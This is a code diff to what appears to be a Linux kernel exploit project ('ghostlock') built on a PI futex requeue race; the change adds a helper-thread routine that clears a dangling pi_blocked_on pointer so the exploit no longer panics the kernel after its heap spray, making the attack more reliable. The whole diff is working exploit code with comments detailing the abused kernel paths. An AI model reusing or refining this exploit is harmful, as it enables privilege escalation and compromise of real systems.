@@ -15,6 +15,68 @@
 using namespace ghostlock;
 
 namespace ghostlock::race {
+    namespace {
+        /* Owns a fresh PI futex just long enough for the waiter to block on it,
+         * then unlocks so the waiter's remove_waiter() runs with a live frame.
+         * Without the held lock the waiter's LOCK_PI takes the fast path and
+         * pi_blocked_on is never touched. */
+        struct DisarmFutex {
+            uint32_t word;
+            std::atomic<int32_t> held;
+        };
+
+        void *disarm_holder_thread(void *arg) {
+            auto *state = static_cast<DisarmFutex *>(arg);
+            support::futex_op(&state->word, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+            state->held.store(1);
+            /* Fixed short delay, not a handshake: the waiter cannot signal
+             * progress from inside a blocking LOCK_PI, so waiting on it would
+             * turn every disarm into a full timeout. 5 ms is ample for the
+             * waiter to enqueue itself, and the UNLOCK_PI below then hands the
+             * lock straight over. */
+            usleep(5000);
+            support::futex_op(&state->word, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            return nullptr;
+        }
+
+        /* Returns 0 once the caller acquired and released the PI futex through
+         * the contended path, which is what rewrites and then clears the stale
+         * pi_blocked_on. */
+        long disarm_pair(uint32_t *word) {
+            DisarmFutex state{};
+            state.word = 0;
+            state.held.store(0);
+            pthread_t holder{};
+            if (pthread_create(&holder, nullptr, disarm_holder_thread, &state) != 0)
+                return -1;
+            while (!state.held.load()) usleep(1000);
+            struct timespec timeout{};
+            SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+            /* The holder releases after 5 ms, so this only fires when the
+             * handoff itself failed; keep it short because it runs once per
+             * route attempt. */
+            timeout.tv_nsec += 200000000L;
+            if (timeout.tv_nsec >= 1000000000L) {
+                timeout.tv_sec++;
+                timeout.tv_nsec -= 1000000000L;
+            }
+            errno = 0;
+            const long rc = support::futex_op(word, FUTEX_LOCK_PI, 0, &timeout, nullptr, 0);
+            const int32_t saved = errno;
+            if (rc == 0) support::futex_op(word, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            pthread_join(holder, nullptr);
+            errno = saved;
+            return rc;
+        }
+    } //
+
+    /* Drops this thread's dangling pi_blocked_on before it exits. */
+    void disarm_pi_ghost(void) {
+        uint32_t word = 0;
+        errno = 0;
+        const long rc = disarm_pair(&word);
+        pr_info("PI ghost disarm ret=%ld errno=%d\n", rc, errno);
+    }
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         const memory::WriteRequest *request = race->request;
@@ -53,18 +115,21 @@ namespace ghostlock::race {
         if (controller.fallback_used) {
             pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
         }
-        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
-            /* remove_waiter() left this thread's pi_blocked_on pointing at the
-         * reclaimed stack waiter. Force one final slow-path removal while the
-         * stack frame is still alive, matching the 5.x multicast primitive's
-         * disarm step. Without this, thread exit leaves a walkable dangling
-         * ghost and the next mm_struct spray can panic the kernel. */
-            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
-            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
-            errno = 0;
-            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
-            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
-        }
+        /* remove_waiter() left this thread's pi_blocked_on pointing at the
+         * reclaimed stack waiter. Thread exit then leaves a walkable dangling
+         * ghost: the RT mutex ->rb_node walk in rt_mutex_adjust_prio_chain()
+         * (reachable from rcu_boost_kthread) dereferences the freed
+         * pi_blocked_on and panics on a NULL+0x9 address. Every route arms the
+         * same FUTEX_WAIT_REQUEUE_PI above, so this is not multicast-specific.
+         *
+         * A LOCK_PI on an uncontended futex takes the fast path and never
+         * touches pi_blocked_on, so the disarm has to force the slow path: a
+         * helper thread owns a fresh PI futex, this thread blocks on it with a
+         * finite timeout, and the helper then unlocks and wakes it. That
+         * block/wake pair runs task_blocks_on_rt_mutex() and remove_waiter()
+         * again, which rewrites pi_blocked_on to the new (live) waiter and
+         * then clears it, dropping the dangling pointer before exit. */
+        disarm_pi_ghost();
         race->route_done.store(1);
         support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         while (!race->owner_chain_done.load())
